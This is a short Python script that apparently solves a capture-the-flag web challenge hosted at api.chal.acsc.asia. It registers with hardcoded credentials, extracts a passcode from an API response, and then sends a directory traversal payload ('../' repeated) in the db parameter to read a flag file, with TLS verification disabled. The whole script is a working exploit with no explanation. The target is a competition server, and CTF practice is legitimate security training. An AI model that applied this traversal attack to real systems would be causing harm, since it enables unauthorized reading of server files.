#!/usr/bin/python3
#*-* coding: utf-8 *-*
import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

username = 'Check'
password = 'Iamp4ssw0rd'
host = 'https://api.chal.acsc.asia'

headers = {
    'User-Agent': "challenge-solver"
}

requests.get(f"{host}/api.php?id={username}&pw={password}&c=u", headers=headers, verify=False).text
requests.get(f"{host}/api.php?id={username}&pw={password}&c=i", headers=headers, verify=False, allow_redirects=False).text
# print(requests.get(f"{host}/api.php?id={username}&pw={password}&c=i&c2=gu", headers=headers, verify=False, allow_redirects=False).text)
passcode = requests.get(f"{host}/api.php?id={username}&pw={password}&c=i&c2=gp", headers=headers, verify=False, allow_redirects=False).text
passcode = urllib.parse.quote_plus(passcode.split("\n")[-1][1:6])
# print(passcode)
# print(len(passcode))

flag = requests.get(f"{host}/api.php?id={username}&pw={password}&c=i&pas={passcode}&c2=gd&db=../../../../../../../../../../../../../flag", headers=headers, verify=False, allow_redirects=False).text
flag = flag.split("\n")[-1][3:-3]
print(flag)
